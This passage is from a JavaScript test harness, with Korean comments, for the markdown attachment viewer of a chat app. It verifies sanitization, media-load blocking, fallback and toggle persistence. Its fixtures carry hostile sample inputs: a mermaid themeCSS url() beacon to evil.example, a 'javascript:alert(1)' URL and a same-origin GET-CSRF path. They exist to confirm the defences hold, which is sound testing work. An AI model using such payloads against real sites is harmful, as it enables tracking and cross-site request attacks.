      if (/evil\.example/.test(a.value)) leftAttrs.push(`${el.tagName.toLowerCase()}[${a.name}]`);
    }
  });
  ok("E2-12 하드닝 단독 — 프로필을 우회해 들어온 srcset/poster/data/xlink:href 를 잡는다",
    leftAttrs.length === 0 && res.blockedMedia === 6,
    `left=${leftAttrs.join(",")} blocked=${res.blockedMedia}`);
  const kept = Array.from(frag.content.querySelectorAll("img")).map((i) => i.getAttribute("src"));
  ok("E2-13 하드닝 단독 — `data:` 만 남고 같은 출처 GET 은 막힌다 (GET-CSRF 차단 · 과잉 차단도 금지)",
    !kept.includes("/static/local.png")
    && !kept.some((s) => (s || "").includes("/api/ai/oauth/authorize"))
    && kept.some((s) => (s || "").startsWith("data:image/")),
    kept.join(","));
  // codex 적대 리뷰 2라운드 [P1] — 하드닝이 끝난 **뒤** 라이브 DOM 으로 SVG 를 넣는 유일한 경로가
  // mermaid 였다. `%%{init:{"themeCSS":"…url(https://evil/x)"}}%%` 가 생성 SVG 의 `<style>` 에
  // 외부 `url()` 을 만들어 sanitize 프로필과 URL 중립화를 **둘 다 우회**한다. 첨부 경로에서는
  // 렌더하지 않고 코드블록으로 둔다 — 구조와 동작 양쪽으로 잠근다.
  ok("E2-15 첨부 렌더 경로는 mermaid 를 렌더하지 않는다 (하드닝 이후 라이브 주입 0)",
    !/renderMermaidDiagrams\(/.test(
      diffJs.slice(diffJs.indexOf("function _renderMarkdownInto"), diffJs.indexOf("function _renderSource"))),
    "‘_renderMarkdownInto’ 안에 renderMermaidDiagrams 호출 잔존");
  {
    const MERM = [
      "# 다이어그램",
      "",
      '%%{init: {"themeCSS": "text{filter:url(https://evil.example/beacon.svg#x)}"}}%%',
      "```mermaid",
      "graph TD; A-->B;",
      "```",
    ];
    const d = await openSource({ ...MD_RESP, rows: mkRows(MERM) });
    const h = d.querySelector(".attach-source-md");
    // 전제 확인: 파이프라인이 실제로 `.mermaid-block` 을 만드는 조합인가. 이 전제가 깨지면
    // 아래 단언은 "변환이 동작한다" 가 아니라 "애초에 대상이 없다" 를 통과시킨다(vacuous).
    ok("E2-16a 전제 — markdownToHtml 이 ```mermaid 를 .mermaid-block 으로 만든다",
      /mermaid-block/.test(markdownToHtml("```mermaid\ngraph TD; A-->B;\n```")));
    ok("E2-16 ```mermaid 는 코드블록으로 남는다 (pending 상태로 방치하지 않음)",
      !!h && h.querySelectorAll("pre code.language-mermaid").length === 1
      && h.querySelectorAll(".mermaid-block,.mermaid-pending,svg").length === 0
      && (h.textContent || "").includes("graph TD; A-->B;"),
      h && h.innerHTML.slice(0, 200));
    // `%%{init:…}%%` 는 markdown 에서 그냥 산문이라 GFM 자동링크가 그 안의 URL 을 `<a href>` 로
    // 만든다 — E2-1 과 같은 이유로 그것은 자동 요청이 아니며(클릭 필요) `rel`/`target` 이 정답이다.
    // 여기서 막아야 하는 것은 mermaid 가 만들었을 **SVG `<style>` 안의 `url()`** 이고, 렌더를
    // 하지 않으므로 애초에 생기지 않는다.
    const evil = [];
    h.querySelectorAll("*").forEach((el) => {
      const tag = el.tagName.toLowerCase();
      for (const a of Array.from(el.attributes)) {
        if (tag === "a" && a.name === "href") continue;
        if (/evil\.example/.test(a.value)) evil.push(`${tag}[${a.name}]`);
      }
    });
    ok("E2-17 themeCSS 지시자가 자동요청 속성·SVG style 로 살아남지 않는다",
      evil.length === 0 && h.querySelectorAll("style,svg").length === 0, evil.join(","));
    const auto = h.querySelector('a[href*="evil.example"]');
    ok("E2-18 자동링크된 그 URL 도 외부 링크 규약을 받는다",
      !!auto && auto.getAttribute("target") === "_blank"
      && /noreferrer/.test(auto.getAttribute("rel") || ""),
      auto ? auto.getAttribute("rel") : "링크 없음");
    STORE = {};
  }
  ok("E2-14 미디어 로드 허용은 `data:image/` 뿐 (같은 출처도 불허 — 콤마 포함 data URI 포함)",
    M._mediaLoadAllowed("data:image/png;base64,AA") === true
    && M._mediaLoadAllowed("/a.png") === false
    && M._mediaLoadAllowed("/api/ai/oauth/authorize?x=1") === false
    && M._mediaLoadAllowed("https://app.local/a.png") === false
    && M._mediaLoadAllowed("//evil.example/a.png") === false
    && M._mediaLoadAllowed("javascript:alert(1)") === false);
  ok("E2-14b 링크 외부 판정은 별 계약 (클릭 이동이라 같은 출처는 내부)",
    M._isSameOriginOrInline("/a") === true
    && M._isSameOriginOrInline("https://app.local/a") === true
    && M._isSameOriginOrInline("//evil.example/a") === false
    && M._isSameOriginOrInline("https://evil.example/a") === false);
}

// ── (F) 폴백 ─────────────────────────────────────────────────────────────────
console.log("\n[F] 렌더 불가 시 폴백 — 빈 화면 금지");
{
  STORE = {};                       // 폴백 축도 렌더 경로 진입이 전제다
  const savedMarked = window.marked;
  window.marked = undefined;                 // 라이브러리 미로드 재현
  MD_IMPL = () => "";                        // markdownToHtml 의 폴백 경로와 같은 산출
  const doc = await openSource(MD_RESP);
  ok("F1 렌더 컨테이너 없음", doc.querySelectorAll(".attach-source-md").length === 0);
  ok("F2 원문 표로 폴백 (빈 화면이 아니다)",
    doc.querySelectorAll("td.attach-diff-code").length === MD_LINES.length);
  const notice = Array.from(doc.querySelectorAll(".attach-diff-notice")).map((n) => n.textContent).join(" ");
  ok("F3 폴백 사유를 배너로 알린다 (무음 강등 금지)", /마크다운으로 렌더하지 못해/.test(notice), notice.slice(0, 80));
  // codex 적대 리뷰 [P2] — 폴백했는데 토글은 켜진 채면 화면과 컨트롤이 반대를 말한다.
  ok("F4 폴백 시 토글이 화면과 일치(체크 해제) + 구문색 토글 복귀",
    doc.querySelector(".attach-source-md-cb").checked === false &&
    doc.querySelector(".attach-diff-hltoggle").hidden === false);
  ok("F5 폴백은 사용자의 선택이 아니므로 저장값을 바꾸지 않는다 (다음 열람에 재시도)",
    STORE.attachSourceMarkdown === undefined, JSON.stringify(STORE));
  window.marked = savedMarked;
  MD_IMPL = markdownToHtml;
}

// ── (G) 실구동 · 영속 · diff 배타 ────────────────────────────────────────────
console.log("\n[G] 토글 실구동 · 영속 · diff 화면 배타");
{
  STORE = {};
  let doc = await openSource(MD_RESP);
  ok("G1 최초 진입은 렌더 (저장값 없음 → 기본 켬)", !!doc.querySelector(".attach-source-md"));
  const cb = doc.querySelector(".attach-source-md-cb");
  cb.checked = false;
  cb.dispatchEvent(new window.Event("change", { bubbles: true }));
  await tick();
  ok("G2 끄면 저장된다", STORE.attachSourceMarkdown === "0", JSON.stringify(STORE));
  doc = await openSource(MD_RESP);
  ok("G3 재오픈 시 끈 상태가 복원된다 (원문 표 + 체크 해제)",
    doc.querySelectorAll(".attach-source-md").length === 0 &&
    doc.querySelector(".attach-source-md-cb").checked === false);
  const cb2 = doc.querySelector(".attach-source-md-cb");
  cb2.checked = true;
  cb2.dispatchEvent(new window.Event("change", { bubbles: true }));
  await tick();
  ok("G4 다시 켜면 렌더로 복귀", !!doc.querySelector(".attach-source-md") &&
    STORE.attachSourceMarkdown === "1");

  // diff 모달 — 변경이 있는 화면에서는 렌더하면 안 된다(어느 줄이 바뀌었는지가 사라진다).
  const versions = [
    { version_number: 1, original_filename: "spec.md", created_by_role: "user" },
    { version_number: 2, original_filename: "spec.md", created_by_role: "user" },
  ];
  const DIFF_RESP = {
    comparable: true, identical: false,
    caps: { source_bytes: 1048576, rows: 6000 }, truncated: {}, stats: { added: 1, removed: 1 },
    from: { version_number: 1, size: 10, sha256: "a", created_at: "2026-08-01" },
    to: { version_number: 2, size: 12, sha256: "b", created_at: "2026-08-12" },
    rows: [
      { type: "equal", left_no: 1, left: "# 제목", right_no: 1, right: "# 제목" },
      { type: "replace", left_no: 2, left: "- 하나", right_no: 2, right: "- 둘" },
    ],
  };
  window.document.body.innerHTML = "";
  API_RESPONSE = DIFF_RESP;
  let mod = mkModule();
  mod.openAttachmentDiffModal(9, versions);
  await tick(); await tick();
  ok("G5 변경이 있는 diff 화면에는 마크다운 토글이 없다 (줄 대조 보존)",
    window.document.querySelector(".attach-source-mdtoggle").hidden === true);
  ok("G6 그 화면은 줄 표로 렌더된다",
    window.document.querySelectorAll("td.attach-diff-code").length > 0 &&
    window.document.querySelectorAll(".attach-source-md").length === 0);

  // identical(= 원문 출력) 화면에서는 원문 보기 모달과 **같은** 방식으로 보여야 한다.
  window.document.body.innerHTML = "";
  API_RESPONSE = {
    ...DIFF_RESP, identical: true,
    stats: { right_lines: MD_LINES.length, left_lines: MD_LINES.length },
    rows: mkRows(MD_LINES),
  };
  mod = mkModule();
  mod.openAttachmentDiffModal(9, versions);
  await tick(); await tick();
  ok("G7 내용 동일 화면은 마크다운 토글 노출 + 렌더 (두 화면이 같은 파일을 다르게 보이지 않게)",
    window.document.querySelector(".attach-source-mdtoggle").hidden === false &&
    !!window.document.querySelector(".attach-source-md"));
  ok("G8 두 모달이 같은 저장 키를 공유한다 (한쪽 설정이 다른 쪽에 적용)",
    (diffJs.match(/attachSourceMarkdown/g) || []).length === 1 &&
    (diffJs.match(/MD_RENDER_KEY/g) || []).length >= 3);
  window.document.body.innerHTML = "";
}

// ── (H) CSS 배선 ─────────────────────────────────────────────────────────────
console.log("\n[H] CSS 배선");
{
  ok("H1 .attach-source-md 규칙 존재", /\.attach-source-md\s*\{/.test(chatCss));
  ok("H2 차단 칩 규칙 존재", /\.attach-source-md-blocked\s*\{/.test(chatCss));
  ok("H3 표 wrap 규칙 존재", /\.attach-source-md-tablewrap\s*\{/.test(chatCss));
  ok("H4 문서 위계 — h1/h2/h3 크기가 서로 다르다 (말풍선은 같은 크기로 눌러 둔다)",
    /\.attach-source-md h1 \{ font-size: 20px/.test(chatCss) &&
    /\.attach-source-md h2 \{ font-size: 17px/.test(chatCss) &&
    /\.attach-source-md h3 \{ font-size: 15px/.test(chatCss));
  ok("H5 blockquote/hr/h4~h6 규칙 존재 (말풍선 CSS 가 덮지 않는 요소)",
    /\.attach-source-md blockquote/.test(chatCss) && /\.attach-source-md hr/.test(chatCss) &&
    /\.attach-source-md h4/.test(chatCss));
  // 셀렉터 자리에 산문이 새면 CSS 파서가 규칙 하나를 통째로 삼킨다(2026-08-07 실적발 —
  // 고아 `*/` 하나가 `code-tok-keyword` 규칙을 삼켰고 문자열 grep·jsdom CSSOM 둘 다 못 잡았다).
  // 형제 하네스(`verify_attach_diff_syntax_highlight.mjs` F8~F10)와 **같은 절차**를 쓴다:
  // ① 주석 균형을 먼저 보고 ② **정상 주석을 제거한 잔여**에서 셀렉터 위치를 검사한다.
  // (초판은 ②를 빼먹어 규칙 사이의 정상 주석이 전부 "산문 누출" 로 잡혔다 — 검사가 아니라
  //  잡음이었다. 주석을 지우고 남는 산문만이 진짜 누출이다.)
  const scanComments = (css) => {
    let i = 0, depth = 0; const orphans = [];
    for (;;) {
      const a = css.indexOf("/*", i), b = css.indexOf("*/", i);
      if (a === -1 && b === -1) break;
      if (a !== -1 && (b === -1 || a < b)) { i = a + 2; depth += 1; }
      else {
        if (depth === 0) orphans.push(css.slice(0, b).split("\n").length);
        else depth -= 1;
        i = b + 2;
      }
    }
    return { orphans, unclosed: depth };
  };
  const { orphans, unclosed } = scanComments(chatCss);
  ok("H6 chat.css 고아 '*/' 없음", orphans.length === 0, `line ${orphans.join(",")}`);
  ok("H7 chat.css 미닫힌 주석 없음", unclosed === 0, `depth ${unclosed}`);
  const stripped = chatCss.replace(/\/\*[\s\S]*?\*\//g, "");
  const bad = [];
  for (const m of stripped.matchAll(/(^|\})([^{}]{0,400}?)\{/g)) {
    const sel = m[2] || "";
    if (/[가-힣]|\*\*/.test(sel)) bad.push(sel.trim().replace(/\s+/g, " ").slice(0, 60));
  }
  ok("H8 셀렉터 위치에 산문(한글·`**`) 누출 0", bad.length === 0, bad.slice(0, 2).join(" | "));
}

console.log(`\n${failed === 0 ? "OK" : "FAILED"} — ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);
